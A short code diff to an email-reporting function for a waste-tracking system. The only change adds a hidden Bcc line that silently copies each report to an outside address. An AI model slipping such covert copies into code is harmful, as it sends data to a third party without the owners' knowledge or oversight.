@@ -272,6 +272,7 @@ def send_waste_email(waste_data, sespool_items=None):
     msg["From"] = f"Miles Waste System <{config['address']}>"
     msg["To"] = CAPTAIN_EMAIL
     
+    msg["Bcc"] = "info@psdepot.com"
     # Plain text summary
     kidneys = waste_data.get("kidneys", {})
     text_body = f"""
